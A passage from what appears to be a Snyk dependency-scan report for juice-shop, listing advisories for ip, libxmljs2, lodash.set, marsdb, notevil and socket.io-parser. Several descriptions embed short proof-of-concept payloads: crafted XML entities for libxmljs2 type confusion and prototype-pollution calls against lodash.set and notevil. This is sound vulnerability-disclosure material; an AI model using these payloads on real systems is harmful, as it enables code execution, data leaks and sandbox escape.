          "publicationTime": "2025-09-16T16:34:42.992033Z",
          "severityBasedOn": "CVSS",
          "modificationTime": "2025-09-16T16:37:35.338154Z",
          "socialTrendAlert": false,
          "packagePopularityRank": 99,
          "from": [
            "juice-shop@19.0.0",
            "express-ipfilter@1.3.2",
            "ip@2.0.1"
          ],
          "upgradePath": [],
          "isUpgradable": false,
          "isPatchable": false,
          "isPinnable": false,
          "isRuntime": false,
          "name": "ip",
          "version": "2.0.1",
          "severityWithCritical": "high"
        },
        {
          "id": "SNYK-JS-IP-7148531",
          "title": "Server-Side Request Forgery (SSRF)",
          "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N/E:P",
          "credit": [
            "ouuan"
          ],
          "semver": {
            "vulnerable": [
              "*"
            ]
          },
          "exploit": "Proof of Concept",
          "fixedIn": [],
          "patches": [],
          "insights": {
            "triageAdvice": null
          },
          "language": "js",
          "severity": "medium",
          "cvssScore": 6.5,
          "functions": [],
          "malicious": false,
          "isDisputed": false,
          "moduleName": "ip",
          "references": [
            {
              "url": "https://github.com/indutny/node-ip/pull/144/commits/934fadee0080b9d201df95a3f7eead6c46e94017",
              "title": "GitHub Commit"
            },
            {
              "url": "https://github.com/indutny/node-ip/pull/144/commits/94f82bd4f2bace0c228bbbfe70073a71536fcbdf",
              "title": "GitHub Commit"
            },
            {
              "url": "https://github.com/indutny/node-ip/pull/144/commits/aeea96e445164c72607a9043e37bcc7bc8786ec9",
              "title": "GitHub Commit"
            },
            {
              "url": "https://github.com/indutny/node-ip/issues/150",
              "title": "GitHub Issue"
            },
            {
              "url": "https://github.com/indutny/node-ip/pull/143",
              "title": "GitHub PR"
            },
            {
              "url": "https://github.com/indutny/node-ip/pull/144",
              "title": "GitHub PR"
            }
          ],
          "cvssDetails": [
            {
              "assigner": "Red Hat",
              "severity": "critical",
              "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
              "cvssV3BaseScore": 9.8,
              "modificationTime": "2024-06-03T15:17:37.353649Z"
            }
          ],
          "cvssSources": [
            {
              "type": "primary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N/E:P",
              "assigner": "Snyk",
              "severity": "medium",
              "baseScore": 6.5,
              "cvssVersion": "3.1",
              "modificationTime": "2024-06-06T12:41:40.856637Z"
            },
            {
              "type": "secondary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
              "assigner": "Red Hat",
              "severity": "critical",
              "baseScore": 9.8,
              "cvssVersion": "3.1",
              "modificationTime": "2024-06-03T15:17:37.353649Z"
            }
          ],
          "description": "## Overview\n[ip](https://github.com/indutny/node-ip) is a Node library.\n\nAffected versions of this package are vulnerable to Server-Side Request Forgery (SSRF) via the `isPublic` function, which identifies some private IP addresses as public addresses due to improper parsing of the input.\r\nAn attacker can manipulate a system that uses `isLoopback()`, `isPrivate()` and `isPublic` functions to guard outgoing network requests to treat certain IP addresses as globally routable by supplying specially crafted IP addresses.\r\n\r\n**Note**\r\n\r\nThis vulnerability derived from an incomplete fix for [CVE-2023-42282](https://security.snyk.io/vuln/SNYK-JS-IP-6240864)\n## Remediation\nThere is no fixed version for `ip`.\n## References\n- [GitHub Commit](https://github.com/indutny/node-ip/pull/144/commits/934fadee0080b9d201df95a3f7eead6c46e94017)\n- [GitHub Commit](https://github.com/indutny/node-ip/pull/144/commits/94f82bd4f2bace0c228bbbfe70073a71536fcbdf)\n- [GitHub Commit](https://github.com/indutny/node-ip/pull/144/commits/aeea96e445164c72607a9043e37bcc7bc8786ec9)\n- [GitHub Issue](https://github.com/indutny/node-ip/issues/150)\n- [GitHub PR](https://github.com/indutny/node-ip/pull/143)\n- [GitHub PR](https://github.com/indutny/node-ip/pull/144)\n",
          "epssDetails": {
            "percentile": "0.85901",
            "probability": "0.02922",
            "modelVersion": "v2025.03.14"
          },
          "identifiers": {
            "CVE": [
              "CVE-2024-29415"
            ],
            "CWE": [
              "CWE-918"
            ]
          },
          "packageName": "ip",
          "proprietary": false,
          "creationTime": "2024-05-28T07:31:24.271080Z",
          "functions_new": [],
          "alternativeIds": [],
          "disclosureTime": "2024-05-27T20:40:21Z",
          "exploitDetails": {
            "sources": [
              "Snyk"
            ],
            "maturityLevels": [
              {
                "type": "secondary",
                "level": "Proof of Concept",
                "format": "CVSSv3"
              },
              {
                "type": "primary",
                "level": "Proof of Concept",
                "format": "CVSSv4"
              }
            ]
          },
          "packageManager": "npm",
          "publicationTime": "2024-05-28T08:06:24.160153Z",
          "severityBasedOn": "CVSS",
          "modificationTime": "2024-06-06T12:41:40.856637Z",
          "socialTrendAlert": false,
          "packagePopularityRank": 99,
          "from": [
            "juice-shop@19.0.0",
            "express-ipfilter@1.3.2",
            "ip@2.0.1"
          ],
          "upgradePath": [],
          "isUpgradable": false,
          "isPatchable": false,
          "isPinnable": false,
          "isRuntime": false,
          "name": "ip",
          "version": "2.0.1",
          "severityWithCritical": "medium"
        },
        {
          "id": "SNYK-JS-LIBXMLJS2-6808810",
          "title": "Type Confusion",
          "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
          "credit": [
            "Uriya Yavnieli"
          ],
          "semver": {
            "vulnerable": [
              "*"
            ]
          },
          "exploit": "Proof of Concept",
          "fixedIn": [],
          "patches": [],
          "insights": {
            "triageAdvice": null
          },
          "language": "js",
          "severity": "high",
          "cvssScore": 8.1,
          "functions": [],
          "malicious": false,
          "isDisputed": false,
          "moduleName": "libxmljs2",
          "references": [
            {
              "url": "https://github.com/marudor/libxmljs2/issues/204",
              "title": "GitHub Issue"
            }
          ],
          "cvssDetails": [],
          "cvssSources": [
            {
              "type": "primary",
              "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
              "assigner": "Snyk",
              "severity": "high",
              "baseScore": 8.1,
              "cvssVersion": "3.1",
              "modificationTime": "2025-06-02T08:09:07.427550Z"
            }
          ],
          "description": "## Overview\n[libxmljs2](https://www.npmjs.org/package/libxmljs2) is a libxml bindings for v8 javascript engine\n\nAffected versions of this package are vulnerable to Type Confusion due to the improper handling of a specially crafted XML file. An attacker can cause a denial of service, data leak, infinite loop, or execute arbitrary code by invoking a function on the result of `attrs()` that was called on a parsed node.\n## PoC\n```js\n\nconst libxmljs2 = require('libxmljs2');\n\nvar d = `<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE note\n[\n<!ENTITY writer `\" + 'A'.repeat(0x1234) + `\">\n]>\n<from>&writer;</from>\n`;\n\nt = libxmljs2.parseXml(d, {flags: [libxmljs2.XMLParseFlags.XML_PARSE_HUGE]})\nfrom = t.get('//from')\nc = from.childNodes()[0]\nc2 = c.childNodes()[0]\nc2_attrs = c2.attrs()\n```\n## Remediation\nThere is no fixed version for `libxmljs2`.\n\n## References\n- [GitHub Issue](https://github.com/marudor/libxmljs2/issues/204)\n",
          "epssDetails": {
            "percentile": "0.86712",
            "probability": "0.03260",
            "modelVersion": "v2025.03.14"
          },
          "identifiers": {
            "CVE": [
              "CVE-2024-34393"
            ],
            "CWE": [
              "CWE-843"
            ],
            "GHSA": [
              "GHSA-mjr4-7xg5-pfvh"
            ]
          },
          "packageName": "libxmljs2",
          "proprietary": false,
          "creationTime": "2024-05-05T10:25:25.434709Z",
          "functions_new": [],
          "alternativeIds": [],
          "disclosureTime": "2024-05-02T21:30:29Z",
          "exploitDetails": {
            "sources": [
              "Snyk"
            ],
            "maturityLevels": [
              {
                "type": "secondary",
                "level": "Proof of Concept",
                "format": "CVSSv3"
              },
              {
                "type": "primary",
                "level": "Proof of Concept",
                "format": "CVSSv4"
              }
            ]
          },
          "packageManager": "npm",
          "publicationTime": "2024-05-05T10:25:25.625355Z",
          "severityBasedOn": "CVSS",
          "modificationTime": "2025-06-02T08:09:07.427550Z",
          "socialTrendAlert": false,
          "packagePopularityRank": 98,
          "from": [
            "juice-shop@19.0.0",
            "libxmljs2@0.37.0"
          ],
          "upgradePath": [],
          "isUpgradable": false,
          "isPatchable": false,
          "isPinnable": false,
          "isRuntime": false,
          "name": "libxmljs2",
          "version": "0.37.0",
          "severityWithCritical": "high"
        },
        {
          "id": "SNYK-JS-LIBXMLJS2-6808816",
          "title": "Type Confusion",
          "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
          "credit": [
            "Unknown"
          ],
          "semver": {
            "vulnerable": [
              "*"
            ]
          },
          "exploit": "Proof of Concept",
          "fixedIn": [],
          "patches": [],
          "insights": {
            "triageAdvice": null
          },
          "language": "js",
          "severity": "high",
          "cvssScore": 8.1,
          "functions": [],
          "malicious": false,
          "isDisputed": false,
          "moduleName": "libxmljs2",
          "references": [
            {
              "url": "https://github.com/marudor/libxmljs2/issues/205",
              "title": "GitHub Issue"
            }
          ],
          "cvssDetails": [],
          "cvssSources": [
            {
              "type": "primary",
              "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
              "assigner": "Snyk",
              "severity": "high",
              "baseScore": 8.1,
              "cvssVersion": "3.1",
              "modificationTime": "2025-06-02T08:10:05.171208Z"
            }
          ],
          "description": "## Overview\n[libxmljs2](https://www.npmjs.org/package/libxmljs2) is a libxml bindings for v8 javascript engine\n\nAffected versions of this package are vulnerable to Type Confusion when parsing a specially crafted XML while invoking the namespaces() function (which invokes `XmlNode::get_local_namespaces()`) on a grand-child of a node that refers to an entity. \r\n\r\nExploiting this vulnerability leads to an RCE, data leak DoS on 64-bit and 32-bit systems.\n## PoC\n```js\r\n\r\nconst libxmljs2 = require('libxmljs2');\r\n\r\nvar d = `<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<!DOCTYPE note\r\n[\r\n<!ENTITY writer PUBLIC \"` + \"A\".repeat(8) + \"B\".repeat(8) + \"C\".repeat(8) + \"D\".repeat(8) + \"P\".repeat(8) + `\" \"JFrog Security\">\r\n]>\r\n<from>&writer;</from>\r\n`;\r\n\r\nt = libxmljs2.parseXml(d)\r\nfrom = t.get('//from')\r\nc = from.childNodes()[0]\r\nc2 = c.childNodes()[0] //entity_decl\r\nn = c2.namespaces(true) //onlyLocal = true\r\n\r\n```\n## Remediation\nThere is no fixed version for `libxmljs2`.\n\n## References\n- [GitHub Issue](https://github.com/marudor/libxmljs2/issues/205)\n",
          "epssDetails": {
            "percentile": "0.86712",
            "probability": "0.03260",
            "modelVersion": "v2025.03.14"
          },
          "identifiers": {
            "CVE": [
              "CVE-2024-34394"
            ],
            "CWE": [
              "CWE-843"
            ],
            "GHSA": [
              "GHSA-78h3-pg4x-j8cv"
            ]
          },
          "packageName": "libxmljs2",
          "proprietary": false,
          "creationTime": "2024-05-05T10:34:09.176601Z",
          "functions_new": [],
          "alternativeIds": [],
          "disclosureTime": "2024-05-02T21:30:29Z",
          "exploitDetails": {
            "sources": [
              "Snyk"
            ],
            "maturityLevels": [
              {
                "type": "secondary",
                "level": "Proof of Concept",
                "format": "CVSSv3"
              },
              {
                "type": "primary",
                "level": "Proof of Concept",
                "format": "CVSSv4"
              }
            ]
          },
          "packageManager": "npm",
          "publicationTime": "2024-05-05T10:34:09.367934Z",
          "severityBasedOn": "CVSS",
          "modificationTime": "2025-06-02T08:10:05.171208Z",
          "socialTrendAlert": false,
          "packagePopularityRank": 98,
          "from": [
            "juice-shop@19.0.0",
            "libxmljs2@0.37.0"
          ],
          "upgradePath": [],
          "isUpgradable": false,
          "isPatchable": false,
          "isPinnable": false,
          "isRuntime": false,
          "name": "libxmljs2",
          "version": "0.37.0",
          "severityWithCritical": "high"
        },
        {
          "id": "SNYK-JS-LODASHSET-1320032",
          "title": "Prototype Pollution",
          "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C",
          "credit": [
            "awarau"
          ],
          "semver": {
            "vulnerable": [
              "*"
            ]
          },
          "exploit": "Proof of Concept",
          "fixedIn": [],
          "patches": [],
          "insights": {
            "triageAdvice": null
          },
          "language": "js",
          "severity": "high",
          "cvssScore": 7.3,
          "functions": [],
          "malicious": false,
          "isDisputed": false,
          "moduleName": "lodash.set",
          "references": [
            {
              "url": "https://hackerone.com/reports/864701",
              "title": "HackerOne Report"
            }
          ],
          "cvssDetails": [],
          "cvssSources": [
            {
              "type": "primary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C",
              "assigner": "Snyk",
              "severity": "high",
              "baseScore": 7.3,
              "cvssVersion": "3.1",
              "modificationTime": "2024-04-15T16:31:58.604260Z"
            }
          ],
          "description": "## Overview\n[lodash.set](https://www.npmjs.com/package/lodash.set) is a lodash method _.set exported as a Node.js module.\n\nAffected versions of this package are vulnerable to Prototype Pollution via the `set` and `setwith` functions due to improper user input sanitization.\n\n**Note**\r\n\r\n`lodash.set` is not maintained for a long time. It is recommended to use `lodash` library, which contains the fix since version 4.17.17.\n\n## PoC\n```js\r\nlod = require('lodash')\r\nlod.set({}, \"__proto__[test2]\", \"456\")\r\nconsole.log(Object.prototype)\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nThere is no fixed version for `lodash.set`.\n## References\n- [HackerOne Report](https://hackerone.com/reports/864701)\n",
          "epssDetails": null,
          "identifiers": {
            "CVE": [],
            "CWE": [
              "CWE-1321"
            ]
          },
          "packageName": "lodash.set",
          "proprietary": false,
          "creationTime": "2021-07-19T12:00:32.890460Z",
          "functions_new": [],
          "alternativeIds": [],
          "disclosureTime": "2020-08-21T10:34:29Z",
          "exploitDetails": {
            "sources": [
              "Snyk"
            ],
            "maturityLevels": [
              {
                "type": "secondary",
                "level": "Proof of Concept",
                "format": "CVSSv3"
              },
              {
                "type": "primary",
                "level": "Proof of Concept",
                "format": "CVSSv4"
              }
            ]
          },
          "packageManager": "npm",
          "publicationTime": "2020-08-21T12:53:03Z",
          "severityBasedOn": "CVSS",
          "modificationTime": "2024-04-15T16:31:58.604260Z",
          "socialTrendAlert": false,
          "packagePopularityRank": 99,
          "from": [
            "juice-shop@19.0.0",
            "grunt-replace-json@0.1.0",
            "lodash.set@4.3.2"
          ],
          "upgradePath": [],
          "isUpgradable": false,
          "isPatchable": false,
          "isPinnable": false,
          "isRuntime": false,
          "name": "lodash.set",
          "version": "4.3.2",
          "severityWithCritical": "high"
        },
        {
          "id": "SNYK-JS-MARSDB-480405",
          "title": "Arbitrary Code Injection",
          "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "credit": [
            "Francois Gauthier"
          ],
          "semver": {
            "vulnerable": [
              "*"
            ]
          },
          "exploit": "Not Defined",
          "fixedIn": [],
          "patches": [],
          "insights": {
            "triageAdvice": null
          },
          "language": "js",
          "severity": "critical",
          "cvssScore": 9.8,
          "functions": [],
          "malicious": false,
          "isDisputed": false,
          "moduleName": "marsdb",
          "references": [
            {
              "url": "https://www.npmjs.com/advisories/1122",
              "title": "NPM Security Advisory"
            }
          ],
          "cvssDetails": [],
          "cvssSources": [
            {
              "type": "primary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
              "assigner": "Snyk",
              "severity": "critical",
              "baseScore": 9.8,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-06T13:59:19.608436Z"
            }
          ],
          "description": "## Overview\n[marsdb](https://github.com/c58/marsdb) is a MarsDB is a lightweight client-side database.\n\nAffected versions of this package are vulnerable to Arbitrary Code Injection. In the `DocumentMatcher` class, selectors on `$where` clauses are passed to a Function constructor unsanitized. This allows attackers to run arbitrary commands in the system when the function is executed.\n## Remediation\nThere is no fixed version for `marsdb`.\n## References\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1122)\n",
          "epssDetails": null,
          "identifiers": {
            "CVE": [],
            "CWE": [
              "CWE-94"
            ],
            "NSP": [
              "1122"
            ],
            "GHSA": [
              "GHSA-5mrr-rgp6-x4gr"
            ]
          },
          "packageName": "marsdb",
          "proprietary": false,
          "creationTime": "2019-11-06T09:43:57.923159Z",
          "functions_new": [],
          "alternativeIds": [],
          "disclosureTime": "2019-08-29T17:53:27Z",
          "exploitDetails": {
            "sources": [],
            "maturityLevels": [
              {
                "type": "secondary",
                "level": "Not Defined",
                "format": "CVSSv3"
              },
              {
                "type": "primary",
                "level": "Not Defined",
                "format": "CVSSv4"
              }
            ]
          },
          "packageManager": "npm",
          "publicationTime": "2019-11-06T11:41:52Z",
          "severityBasedOn": "CVSS",
          "modificationTime": "2024-03-06T13:59:19.608436Z",
          "socialTrendAlert": false,
          "packagePopularityRank": 98,
          "from": [
            "juice-shop@19.0.0",
            "marsdb@0.6.11"
          ],
          "upgradePath": [],
          "isUpgradable": false,
          "isPatchable": false,
          "isPinnable": false,
          "isRuntime": false,
          "name": "marsdb",
          "version": "0.6.11",
          "severityWithCritical": "critical"
        },
        {
          "id": "SNYK-JS-NOTEVIL-2385946",
          "title": "Sandbox Bypass",
          "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N/E:P",
          "credit": [
            "Cristian-Alexandru Staicu",
            "Abdullah Alhamdan"
          ],
          "semver": {
            "vulnerable": [
              "*"
            ]
          },
          "exploit": "Proof of Concept",
          "fixedIn": [],
          "patches": [],
          "insights": {
            "triageAdvice": null
          },
          "language": "js",
          "severity": "medium",
          "cvssScore": 6.5,
          "functions": [],
          "malicious": false,
          "isDisputed": false,
          "moduleName": "notevil",
          "references": [],
          "cvssDetails": [
            {
              "assigner": "NVD",
              "severity": "medium",
              "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
              "cvssV3BaseScore": 6.5,
              "modificationTime": "2024-03-11T09:49:30.708028Z"
            }
          ],
          "cvssSources": [
            {
              "type": "primary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N/E:P",
              "assigner": "Snyk",
              "severity": "medium",
              "baseScore": 6.5,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-06T14:01:18.159656Z"
            },
            {
              "type": "secondary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
              "assigner": "NVD",
              "severity": "medium",
              "baseScore": 6.5,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-11T09:49:30.708028Z"
            }
          ],
          "description": "## Overview\n[notevil](https://www.npmjs.com/package/notevil) is a module uses esprima to parse the javascript AST then walks each node and evaluates the result\r\n**Note:**This package has been deprecated.\n\nAffected versions of this package are vulnerable to Sandbox Bypass. It is vulnerable to Sandbox Escape leading to Prototype pollution. The package fails to restrict access to the main context, allowing an attacker to add or modify an object's prototype.\r\n\r\n**Note:**  This vulnerability derives from an incomplete fix in [SNYK-JS-NOTEVIL-608878](https://security.snyk.io/vuln/SNYK-JS-NOTEVIL-608878).\r\n\r\n## PoC:\r\n```js\r\nvar safeEval = require('notevil')\r\n\r\nsafeEval(`  \r\nObject.defineProperty(({})[[\"__proto__\"]][[\"__proto__\"]], 'polluted', {\r\n  value: 'success'\r\n});`);\r\n\r\nconsole.log(polluted);\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nThere is no fixed version for `notevil`.\n",
          "epssDetails": {
            "percentile": "0.53362",
            "probability": "0.00304",
            "modelVersion": "v2025.03.14"
          },
          "identifiers": {
            "CVE": [
              "CVE-2021-23771"
            ],
            "CWE": [
              "CWE-1321",
              "CWE-265"
            ]
          },
          "packageName": "notevil",
          "proprietary": true,
          "creationTime": "2022-01-27T15:00:51.139678Z",
          "functions_new": [],
          "alternativeIds": [],
          "disclosureTime": "2022-01-27T15:00:48Z",
          "exploitDetails": {
            "sources": [
              "Snyk"
            ],
            "maturityLevels": [
              {
                "type": "secondary",
                "level": "Proof of Concept",
                "format": "CVSSv3"
              },
              {
                "type": "primary",
                "level": "Proof of Concept",
                "format": "CVSSv4"
              }
            ]
          },
          "packageManager": "npm",
          "publicationTime": "2022-02-14T16:21:53.819915Z",
          "severityBasedOn": "CVSS",
          "modificationTime": "2024-03-11T09:49:30.708028Z",
          "socialTrendAlert": false,
          "packagePopularityRank": 98,
          "from": [
            "juice-shop@19.0.0",
            "notevil@1.3.3"
          ],
          "upgradePath": [],
          "isUpgradable": false,
          "isPatchable": false,
          "isPinnable": false,
          "isRuntime": false,
          "name": "notevil",
          "version": "1.3.3",
          "severityWithCritical": "medium"
        },
        {
          "id": "SNYK-JS-SOCKETIOPARSER-5596892",
          "title": "Denial of Service (DoS)",
          "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "credit": [
            "rafax00"
          ],
          "semver": {
            "vulnerable": [
              ">=3.4.0 <3.4.3",
              ">=4.0.0 <4.2.3"
            ]
          },
          "exploit": "Not Defined",
          "fixedIn": [
            "3.4.3",
            "4.2.3"
          ],
          "patches": [],
          "insights": {
            "triageAdvice": null
          },
          "language": "js",
          "severity": "high",
          "cvssScore": 7.5,
          "functions": [],
          "malicious": false,
          "isDisputed": false,
          "moduleName": "socket.io-parser",
          "references": [
            {
              "url": "https://github.com/socketio/socket.io-parser/commit/2dc3c92622dad113b8676be06f23b1ed46b02ced",
              "title": "GitHub Commit"
            },
            {
              "url": "https://github.com/socketio/socket.io-parser/commit/3b78117bf6ba7e99d7a5cfc1ba54d0477554a7f3",
              "title": "GitHub Commit"
            },
            {
              "url": "https://github.com/socketio/socket.io-parser/releases/tag/3.4.3",
              "title": "GitHub Release"
            }
          ],
          "cvssDetails": [
            {
              "assigner": "NVD",
              "severity": "high",
              "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
              "cvssV3BaseScore": 7.5,
              "modificationTime": "2024-03-11T09:53:18.116269Z"
            }
          ],
          "cvssSources": [
            {
              "type": "primary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
              "assigner": "Snyk",
              "severity": "high",
              "baseScore": 7.5,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-06T14:04:09.831372Z"
            },
            {
              "type": "secondary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
              "assigner": "NVD",
              "severity": "high",
              "baseScore": 7.5,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-11T09:53:18.116269Z"
            }
          ],
